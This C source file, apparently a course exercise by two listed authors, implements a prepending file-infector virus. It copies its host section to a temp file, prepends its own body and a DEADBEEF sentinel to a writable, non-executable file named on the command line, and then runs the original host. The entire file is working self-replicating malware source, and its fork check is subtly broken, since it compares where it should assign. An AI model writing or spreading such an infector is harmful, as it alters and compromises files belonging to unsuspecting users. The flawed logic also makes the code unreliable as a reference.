//@authors hhamilto, mjagbeke
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <strings.h>
#include <sys/wait.h>

#include "util.c"

int runHost(char* hostFile, char ** argv);

int main(int argc, char** argv){
	int thisFileFd, tmpHostFd, toInfectFd;
	int i;
	off_t sentinelOff;
	uid_t ruid;
	char tmpHostFileName[30];
	unsigned char buf;
	struct stat arg1Stat;
	unsigned char* arg1Buf;

	//copy host to temp file
	thisFileFd = open(argv[0], O_RDONLY);
	ruid = getuid();

	sprintf(tmpHostFileName,"/tmp/host.%d", ruid);
	tmpHostFd = open(tmpHostFileName, O_WRONLY|O_CREAT|O_EXCL, S_IXUSR);
	if(tmpHostFd==-1){
		//tmp host already exists
		unlink(tmpHostFileName);
		//printf("tmp file existed\n");
		return 1;
	}
	//copy over host to tmp file
	sentinelOff = sentinelOffset(thisFileFd);
	lseek(thisFileFd, sentinelOff+4,SEEK_SET);
	while(read(thisFileFd, &buf, 1)!=0){write(tmpHostFd,&buf,1);}
	// determine whether arg1 is owned and can be written by the real uid of the 
	// executing processs and does *not* have the owner group or world execute bit set
	if(   argc>=2 &&
	      stat(argv[1],&arg1Stat) != -1 &&
	      arg1Stat.st_uid == ruid &&
	      (arg1Stat.st_mode &(S_IWUSR)) != 0 &&
	      (arg1Stat.st_mode &(S_IXUSR|S_IXGRP|S_IXOTH)) == 0){
		toInfectFd = open(argv[1], O_RDWR);
		if(sentinelOffset(toInfectFd) != -1){
			//printf("host was already infected \n");
			close(tmpHostFd);
			close(thisFileFd);
			close(toInfectFd);
			return runHost(tmpHostFileName, argv);
		}
		//prepend virus
		//printf("Prepending Virus\n");
		//save arg file into buffer
		arg1Buf = malloc(arg1Stat.st_size);
		i = 0;
		lseek(toInfectFd, 0, SEEK_SET);
		while((i+=read(toInfectFd, arg1Buf+i, arg1Stat.st_size-i))<arg1Stat.st_size);
		lseek(toInfectFd, 0, SEEK_SET);
		lseek(thisFileFd, 0, SEEK_SET);
		//write the virus in there
		i = 0;
		while(lseek(thisFileFd, 0, SEEK_CUR)<sentinelOff){
			//this is pretty inefficent, but easy to code and reason about
			read(thisFileFd, &buf, 1);
			write(toInfectFd,&buf,1);}
		buf =0xDE;
		write(toInfectFd,&buf,1);
		buf =0xAD;
		write(toInfectFd,&buf,1);
		buf =0xBE;
		write(toInfectFd,&buf,1);
		buf =0xEF;
		write(toInfectFd,&buf,1);
		//write rest (host)
		i = 0;
		while((i+=write(toInfectFd, arg1Buf+i, arg1Stat.st_size-i))<arg1Stat.st_size);
		close(tmpHostFd);
		close(thisFileFd);
		close(toInfectFd);
		free(arg1Buf);
		return runHost(tmpHostFileName, argv);
	}else{
		//printf("argv[1] didn't seem legit to infect\n");
		close(tmpHostFd);
		close(thisFileFd);
		return runHost(tmpHostFileName, argv);
	}
}

int runHost(char* hostFile, char ** argv){
	//printf("Running host: %s\n", hostFile);
	// fork, wait clean up temp file.
	pid_t child = 0;
	int childStatus = -1;
	if(child == fork()){// you can thank the -Wall for the extra parens
		wait(&childStatus);
	}else{
		execvp(hostFile, argv);
		perror("Host failed to execvp: ");
	}
	unlink(hostFile);
	return childStatus;// return actual status from wait here.
}
